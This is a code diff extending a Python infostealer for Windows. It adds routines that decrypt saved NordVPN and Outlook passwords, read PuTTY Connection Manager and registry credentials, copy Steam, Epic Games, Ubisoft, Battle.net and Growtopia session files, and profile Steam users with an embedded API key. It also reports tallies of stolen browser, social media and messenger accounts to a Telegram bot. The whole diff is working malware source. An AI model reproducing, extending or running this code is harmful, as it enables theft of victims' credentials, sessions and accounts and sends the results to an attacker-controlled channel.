@@ -1,4 +1,5 @@
 import ctypes
+from datetime import datetime
 import json
 import asyncio
 import base64
@@ -6,6 +7,7 @@ import re
 import sys
 import time
 import winreg
+import win32con # type: ignore
 import aiohttp # type: ignore
 import os
 import shutil
@@ -16,7 +18,9 @@ import psutil # type: ignore
 import win32api # type: ignore
 
 from pathlib import Path
+import xml.etree.ElementTree as ET
 from ctypes import *
+import winreg as reg
 from urllib.request import urlopen
 from json import loads
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
@@ -146,6 +150,7 @@ class get_data:
             asyncio.create_task(self.GetCards()),
             asyncio.create_task(self.GetCookies()),
             asyncio.create_task(self.GetAutoFills()),
+            asyncio.create_task(self.StealSteamUser()),
             asyncio.create_task(self.StealDiscord()),
             InfoStealer().run_all_fonctions(),
             ]
@@ -1090,6 +1095,49 @@ class get_data:
             await error_handler()
             pass
 
+    async def DecryptNordVPN(self, encrypted) -> None:
+        try:
+            encrypted_data = base64.b64decode(encrypted)
+            return WindowsApi.CryptUnprotectData(encrypted_data).decode('utf-8')
+        except Exception:
+            await error_handler()
+            return ""
+
+    async def StealNordVPN(self, driectory_path):
+        vpn_path = os.path.join(self.appdata, "NordVPN")
+
+        if not os.path.exists(vpn_path):
+            return
+
+        try:
+
+            for root, dirs, files in os.walk(vpn_path):
+                for directory in dirs:
+                    user_config_path = os.path.join(root, directory, "user.config")
+                    if not os.path.exists(user_config_path):
+                        continue
+
+                    vpn_version_path = os.path.join(driectory_path, "VPN", "NordVPN", directory)
+                    os.makedirs(vpn_version_path, exist_ok=True)
+
+                    tree = ET.parse(user_config_path)
+                    root_xml = tree.getroot()
+
+                    encoded_username = root_xml.find(".//setting[@name='Username']/value").text
+                    encoded_password = root_xml.find(".//setting[@name='Password']/value").text
+
+                    if not encoded_username or not encoded_password:
+                        continue
+
+                    username = await self.DecryptNordVPN(encoded_username)
+                    password = await self.DecryptNordVPN(encoded_password)
+
+                    with open(os.path.join(vpn_version_path, "nordvpn_account.txt"), "a") as file:
+                        file.write(f"Username: {username}\nPassword: {password}\n\n")
+        except Exception:
+            await error_handler()
+            pass
+
     async def BackupThunderbird(self, directory_path: str) -> None:
         try:
             thunderbird_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Thunderbird', 'Profiles')
@@ -1140,6 +1188,89 @@ class get_data:
         except Exception:
             await error_handler()
             pass
+
+    async def DecryptOutlook(encrypted_value) -> None:
+        try:
+            encrypted_data = encrypted_value[1:]
+            blob_in = ctypes.windll.kernel32.LocalAlloc(0x40, len(encrypted_data))
+            ctypes.windll.kernel32.RtlMoveMemory(blob_in, bytes(encrypted_data), len(encrypted_data))
+
+            data_out = ctypes.c_void_p()
+            if ctypes.windll.crypt32.CryptUnprotectData(
+                ctypes.byref(ctypes.c_buffer(encrypted_data)), None, None, None, None, 0, ctypes.byref(data_out)):
+                decrypted_data = ctypes.cast(data_out, ctypes.POINTER(ctypes.c_ubyte))
+                length = ctypes.windll.kernel32.LocalSize(data_out)
+                return bytes(bytearray([decrypted_data[i] for i in range(length)])).decode("utf-8").replace("\x00", "")
+        except:
+            return "null"
+
+    async def get_info_from_registry(self, path, value_name) -> None:
+        try:
+            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_READ)
+            value, regtype = reg.QueryValueEx(registry_key, value_name)
+            reg.CloseKey(registry_key)
+            return value
+        except Exception as e:
+            return None
+
+    async def StealOutlook(self, directory_path) -> None:
+        mail_client_regex = re.compile(r'^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$')
+        smtp_client_regex = re.compile(r'^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$')
+
+        outlook_path = os.path.join(directory_path, "Email", 'OutlookMail')
+
+        reg_directories = [
+            r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+            r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+            r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+            r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"
+        ]
+
+        mail_clients = [
+            "SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address",
+            "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name", "Email", "HTTP User", "HTTP Server URL",
+            "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2",
+            "IMAP Password2", "NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password",
+            "NNTP Password", "HTTPMail Password", "SMTP Password",
+        ]
+
+        data = ""
+        for directory in reg_directories:
+            data += await self.get_data_from_registry(directory, mail_clients, mail_client_regex, smtp_client_regex)
+
+        if data:
+            os.makedirs(outlook_path, exist_ok=True)
+            with open(os.path.join(outlook_path, "Outlook.txt"), "w") as file:
+                file.write(data + "\r\n")
+
+    async def get_data_from_registry(self, path, clients, mail_client_regex, smtp_client_regex) -> None:
+        data = ""
+        try:
+            for client in clients:
+                try:
+                    value = await self.get_info_from_registry(path, client)
+                    if value and "Password" in client and "2" not in client:
+                        data += f"{client}: {await self.DecryptOutlook(value)}\r\n"
+                    elif value and (smtp_client_regex.match(value) or mail_client_regex.match(value)):
+                        data += f"{client}: {value}\r\n"
+                    elif value:
+                        decoded_value = value.decode("utf-8").replace("\x00", "")
+                        data += f"{client}: {decoded_value}\r\n"
+                except Exception:
+                    await error_handler()
+                    pass
+
+            with reg.OpenKey(reg.HKEY_CURRENT_USER, path) as key:
+                subkeys_count = reg.QueryInfoKey(key)[0]
+                for i in range(subkeys_count):
+                    subkey_name = reg.EnumKey(key, i)
+                    data += await self.get_data_from_registry(f"{path}\\{subkey_name}", clients, mail_client_regex, smtp_client_regex)
+
+        except Exception:
+            await error_handler()
+            pass
+
+        return data
 
     async def StealFileZilla(self, directory_path: str) -> None:
         try:
@@ -1250,6 +1381,59 @@ class get_data:
         except Exception:
             await error_handler()
 
+
+    async def StealPutty(self, directory_path: str) -> None:
+        try:
+            database_path = self.get_default_database()
+        except Exception:
+            await error_handler()
+            return
+
+        full_path = os.path.join(directory_path, "FTP Clients", "Putty", database_path)
+        
+        if os.path.exists(full_path):
+            pwd_found = await self.parse_xml(full_path)
+            await self.save_to_file(pwd_found, directory_path)
+        else:
+            await error_handler()
+
+    def get_default_database(self) -> str:
+        access_read = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
+        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software\\ACS\\PuTTY Connection Manager', 0, access_read)
+        this_name, _ = win32api.RegQueryValueEx(key, 'DefaultDatabase')
+        return str(this_name) if this_name else ' '
+
+    async def parse_xml(self, xml_file: str) -> list:
+        try:
+            tree = ET.parse(xml_file)
+            root = tree.getroot()
+            pwd_found = []
+
+            for connection in root.findall('connection'):
+                values = {}
+                for child in connection:
+                    if child.tag in ['name', 'protocol', 'host', 'port', 'description', 'login', 'password']:
+                        values[child.tag] = child.text
+
+                if values:
+                    pwd_found.append(values)
+
+            return pwd_found
+        except ET.ParseError:
+            await error_handler()
+            return []
+
+    async def save_to_file(self, data: list, directory_path: str) -> None:
+        output_file = os.path.join(directory_path, "FTP Clients", "Putty", 'putty_connections.txt')
+        try:
+            with open(output_file, 'w') as file:
+                for entry in data:
+                    for key, value in entry.items():
+                        file.write(f"{key}: {value}\n")
+                    file.write("\n")
+        except IOError:
+            await error_handler()
+            pass
 
     async def StealPasswordManagers(self, directory_path: str) -> None:
         try:
@@ -1660,18 +1844,14 @@ class get_data:
                     pathC = path + arg
                     pathKey = path + "/Local State"
 
-                    with open(pathKey, 'r', encoding='utf-8') as f:
-                        local_state = json.loads(f.read())
-
-                    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-                    master_key = WindowsApi.CryptUnprotectData(master_key[5:])
+                    key = WindowsApi.GetKey(pathKey)
 
                     for file in os.listdir(pathC):
                         if file.endswith(".log") or file.endswith(".ldb"):
                             with open(f"{pathC}\\{file}", 'r', errors="ignore") as f:
                                 for line in [x.strip() for x in f.readlines() if x.strip()]:
                                     for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                                        TokenDecoded = WindowsApi.Decrpytion(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                                        TokenDecoded = WindowsApi.Decrpytion(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), key)
                                         if await CheckToken(TokenDecoded):
                                             if TokenDecoded not in tokens:
                                                 tokens.append(TokenDecoded)
@@ -1718,6 +1898,144 @@ class get_data:
 
 
 
+    async def StealSteamUser(self) -> None:
+        try:
+            all_disks = []
+            for drive in range(ord('A'), ord('Z')+1):
+                drive_letter = chr(drive)
+                if os.path.exists(drive_letter + ':\\'):
+                    all_disks.append(drive_letter)
+
+            for steam_paths in all_disks:
+                steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
+                if os.path.isfile(steam_paths):
+                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
+                        steamid = "".join(re.findall(r"7656[0-9]{13}", file.read()))
+                        if steamid:
+                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                                url1 = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids={steamid}"
+                                url2 = f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}"
+                                url3 = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}&include_appinfo=true&include_played_free_games=true"
+
+                                async with session.get(url1) as req:
+                                    player_summary = await req.json()
+
+                                async with session.get(url2) as req2:
+                                    player_level = await req2.json()
+
+                                async with session.get(url3) as req3:
+                                    player_games = await req3.json()
+
+                                player_data = player_summary["response"]["players"][0]
+                                personname = player_data["personaname"]
+                                profileurl = player_data["profileurl"]
+                                timecreated = player_data["timecreated"]
+                                creation_date = datetime.utcfromtimestamp(timecreated).strftime('%d-%m-%Y')
+
+                                if player_data.get("realname"):
+                                    realname = player_data["realname"]
+                                else:
+                                    realname = "None"
+
+                                level = player_level["response"]["player_level"]
+                                total_games = player_games["response"]["game_count"]
+
+                                ListFonction.SteamUserAccounts.append(f"Real Name: {realname}\nPerson Name: {personname}\nProfile URL: {profileurl}\nCreation Date: {creation_date}\nPlayer Level: {level}\nTotal games: {total_games}\n")
+                                
+        except Exception:
+            await error_handler()
+
+
+    async def StealUbisoft(self, directory_path: str) -> None:
+        try:
+            ubisoft_path = os.path.join(self.LocalAppData, "Ubisoft Game Launcher")
+            copied_path = os.path.join(directory_path, "Games", "Uplay")
+            if os.path.isdir(ubisoft_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                for file in os.listdir(ubisoft_path):
+                    name_of_files = os.path.join(ubisoft_path, file)
+                    try:
+                        shutil.copy(name_of_files, os.path.join(copied_path, file))
+                    except:
+                        continue
+        except Exception:
+            await error_handler()
+            pass
+
+    async def StealEpicGames(self, directory_path: str) -> None:
+        try:
+            epic_path = os.path.join(self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows")
+            copied_path = os.path.join(directory_path, "Games", "Epic Games")
+            if os.path.isdir(epic_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                try:
+                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
+                except:
+                    pass
+
+        except Exception:
+            await error_handler()
+            pass
+
+    async def StealGrowtopia(self, directory_path: str) -> None:
+        try:
+            growtopia_path = os.path.join(self.LocalAppData, "Growtopia", "save.dat")
+            copied_path = os.path.join(directory_path, "Games", "Growtopia")
+            if os.path.isfile(growtopia_path):
+                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
+        except Exception:
+            await error_handler()
+            pass
+
+    async def StealSteamFiles(self, directory_path: str) -> None:
+        try:
+            save_path = os.path.join(directory_path)
+            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
+            if os.path.isdir(steam_path):
+                to_path = os.path.join(save_path, "Games", "Steam")
+                if not os.path.isdir(to_path):
+                    os.mkdir(to_path)
+                shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
+        except Exception:
+            await error_handler()
+            return "null"
+        
+    
+
+    async def StealBattleNet(self, directory_path) -> None:
+        battle_net_path = os.path.join(self.appdata, 'Battle.net')
+        if not os.path.exists(battle_net_path):
+            return
+
+        try:
+
+            battle_path = os.path.join(directory_path, "Games", "Battle Net")
+            os.makedirs(battle_path, exist_ok=True)
+
+            for pattern in ["*.db", "*.config"]:
+                for root, dirs, files in os.walk(battle_net_path):
+                    for file in files:
+                        if file.endswith(tuple(pattern.split("*"))):
+                            try:
+                                file_path = os.path.join(root, file)
+                                if os.path.basename(root) == "Battle.net":
+                                    destination_dir = directory_path
+                                else:
+                                    destination_dir = os.path.join(directory_path, os.path.basename(root))
+
+                                os.makedirs(destination_dir, exist_ok=True)
+
+                                shutil.copy(file_path, os.path.join(destination_dir, file))
+                            except Exception:
+                                await error_handler()
+                                return
+
+
+        except Exception:
+            await error_handler()
+            pass
 
 
 
@@ -1734,6 +2052,7 @@ class get_data:
             os.mkdir(os.path.join(filePath, "Computer"))
             os.mkdir(os.path.join(filePath, "Browsers"))
             os.mkdir(os.path.join(filePath, "Sessions"))
+            os.mkdir(os.path.join(filePath, "Games"))
             
           
             if ListFonction.SystemInfo:
@@ -1846,27 +2165,48 @@ class get_data:
 
             tasks = [
                 self.StealWallets(filePath),
+
+                # Messengers
                 self.StealTelegramSession(filePath),
                 self.StealWhatsApp(filePath),
                 self.StealSignal(filePath),
                 self.StealSkype(filePath),
                 self.StealElement(filePath),
-                self.StealProtonVPN(filePath),
-                self.StealOpenVPN(filePath),
-                self.StealSurfsharkVPN(filePath),
                 self.StealPidgin(filePath),
                 self.StealTox(filePath),
                 self.StealViber(filePath),
+
+                # VPN Files
+                self.StealProtonVPN(filePath),
+                self.StealOpenVPN(filePath),
+                self.StealSurfsharkVPN(filePath),
+                self.StealNordVPN(filePath),
+                
+                
+                # FTP Client
                 self.StealFileZilla(filePath),
-                self.StealPasswordManagers(filePath),
                 self.StealWinSCP(filePath),
+                self.StealPutty(filePath),
+
+                # BackupMail
                 self.BackupMailbird(filePath),
-                self.BackupThunderbird(filePath)
+                self.BackupThunderbird(filePath),
+                self.StealOutlook(filePath),
+
+                # Password Manager
+                self.StealPasswordManagers(filePath),
+
+                # Games
+                self.StealUbisoft(filePath),
+                self.StealEpicGames(filePath),
+                self.StealGrowtopia(filePath),
+                self.StealSteamFiles(filePath),
+                self.StealBattleNet(filePath),
             ]
             
             await asyncio.gather(*tasks)
             
-            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients"]
+            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games"]
             
             for folder in folders_to_check:
                 try:
@@ -1931,10 +2271,27 @@ class get_data:
             text = f"""
 <b>👤  <i><u>{platform.node()} - Files Counts</u></i></b>
 
+<b><i><u>Browser</u></i></b>
 <b>Cards:</b> <code>{str(len(ListFonction.Cards))}</code>
 <b>Passwords:</b> <code>{str(len(ListFonction.Passwords))}</code>
 <b>Cookies:</b> <code>{str(len(ListFonction.Cookies))}</code>
 <b>Autofills:</b> <code>{str(len(ListFonction.Autofills))}</code>
+
+<b><i><u>Social Media</u></i></b>
+<b>Reddit:</b> <code>{str(len(ListFonction.RedditAccounts))}</code>
+<b>Instagram:</b> <code>{str(len(ListFonction.InstagramAccounts))}</code>
+<b>Guilded:</b> <code>{str(len(ListFonction.GuildedAccounts))}</code>
+<b>Patreon:</b> <code>{str(len(ListFonction.PatreonAccounts))}</code>
+<b>Spotify:</b> <code>{str(len(ListFonction.SpotifyAccount))}</code>
+<b>Twitch:</b> <code>{str(len(ListFonction.TwitchAccounts))}</code>
+<b>Twitter:</b> <code>{str(len(ListFonction.TwitterAccounts))}</code>
+<b>TikTok:</b> <code>{str(len(ListFonction.TikTokAccounts))}</code>
+<b>RiotUser</b> <code>{str(len(ListFonction.RiotUserAccounts))}</code>
+<b>Roblox</b> <code>{str(len(ListFonction.RobloxAccounts))}</code>
+
+<b><i><u>Messenger</u></i></b>
+<b>Discord</b> <code>{str(len(ListFonction.DiscordAccounts))}</code>
+<b>SteamUser</b> <code>{str(len(ListFonction.SteamUserAccounts))}</code>
 """
 
             send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
